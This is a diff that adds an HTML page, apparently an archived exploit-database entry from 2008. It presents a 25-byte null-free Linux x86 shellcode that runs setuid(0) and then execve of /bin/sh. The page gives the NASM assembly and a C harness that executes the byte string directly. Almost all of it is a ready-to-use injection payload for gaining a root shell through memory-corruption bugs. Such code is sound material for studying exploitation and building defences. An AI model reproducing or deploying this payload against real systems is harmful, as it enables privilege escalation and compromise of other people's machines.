@@ -1,0 +1,48 @@
+<html><head><title>linux/x86 setuid(0) & execve(/bin/sh,0,0) shellcode 25 bytes</title></head><pre>SMALLEST SETUID &amp; EXECVE GNU/LINUX x86 SHELLCODE WITHOUT NULLS THAT SPAWNS A SHELL
+
+History:
+   + v1.0 (27 bytes) =&gt; http://opensec.es/2008/11/14/gnulinux-x86-setuid0-execvebinsh00-shellcode-without-null/
+   + v2.0 (26 bytes) =&gt; (http://vlan7.blogspot.com/) http://packetstormsecurity.org/filedesc/smallest_setuid_execve_sc.c.html
+
+v3.0 (25 bytes)
+################
+
+[NASM_SOURCE_CODE]
+global _start
+section .text
+_start:
+;setuid
+xor ecx,ecx
+lea eax,[ecx+17h];setuid syscall
+int 80h
+;execve
+push ecx;ecx = 0
+push 0x68732f6e ;sh/
+push 0x69622f2f ;nib//
+mov ebx,esp;pointer to &quot;struct pt_regs&quot;
+lea eax,[ecx+0Bh];execve syscall
+int 80h
+[/NASM_SOURCE_CODE]
+
+[C_SOURCE_CODE]
+#include &lt;stdio.h&gt;
+
+const char shellcode[]=    &quot;\x31\xc9\x8d\x41\x17\xcd\x80\x51\x68\x6e\x2f\x73&quot;
+           &quot;\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80&quot;;
+
+int main()
+{
+   printf(&quot;\nSMALLEST SETUID &amp; EXECVE GNU/LINUX x86 SHELLCODE WITHOUT NULLS THAT SPAWNS A SHELL&quot;
+           &quot;\n\nCoded by Chema Garcia (aka sch3m4)&quot;
+           &quot;\n\t + sch3m4@opensec.es&quot;
+           &quot;\n\t + http://opensec.es&quot;
+           &quot;\n\n[+] Date: 22/11/2008&quot;
+           &quot;\n\n[+] Thanks to: vlan7&quot;
+           &quot;\n\n[+] Shellcode Size: %d bytes\n\n&quot;,sizeof(shellcode)-1);
+         (*(void (*)()) shellcode)();
+
+   return 0;
+}
+[/C_SOURCE_CODE]
+
+// milw0rm.com [2008-11-22]</pre></html>
